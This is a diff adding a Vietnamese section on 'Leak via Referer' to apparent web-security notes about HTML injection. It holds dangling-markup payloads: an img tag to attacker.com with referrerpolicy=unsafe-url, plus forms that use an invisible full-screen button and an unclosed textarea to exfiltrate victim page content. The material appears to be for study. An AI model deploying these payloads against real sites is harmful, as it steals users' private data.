@@ -108,4 +108,38 @@ HtmlSource
 ```
 
 ### Leak via Referer
+- Chúng ta sẽ thực hiện leak với `textarea` ngay cả khi CSP không cho host bên ngoài 
+- Cái này chỉ có thể thực hiện trên `Chromium` và yêu cầu có 1 `</textarea>` ngay sau 
+- Inject đoạn đầu tiên : 
+    - `<img src="https://attacker.com" referrerpolicy="unsafe-url">` 
+- Đoạn thứ 2 
+```html
+<form action="/referer-leak" method="GET">
+<button type="submit" style="position: fixed; z-index: 999999; top: 0; left: 0;
+                             width: 100vw; height: 100vh; opacity: 0"></button>
+<textarea name="leak">
+................
+................
+Đoạn nay của nạn nhân 
+................
+................
+</textarea>
+```
+- `action=` trỏ tới nơi chứa injection referer thứ hai
+- Khi user click (thậm chí vô ý do button phủ full-screen), form submit và nội dung `<textarea>` bị đưa vào `?leak=`
+- Tuy nhiên nếu không có chỗ lưu `Referer leak` . Ta cần phải dùng Payload khác 
+```html
+<form action="" method="GET">
+<input type="hidden" name="html" value="<img src=https://attacker.com referrerpolicy=unsafe-url>">
+<button type="submit" style="position: fixed; z-index: 999999; top: 0; left: 0;
+                             width: 100vw; height: 100vh; opacity: 0"></button>
+<textarea name="leak">
+................
+................
+Đoạn nay của nạn nhân 
+................
+................
+</textarea>
+```
+- Url sẽ load như sau `https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E`
 
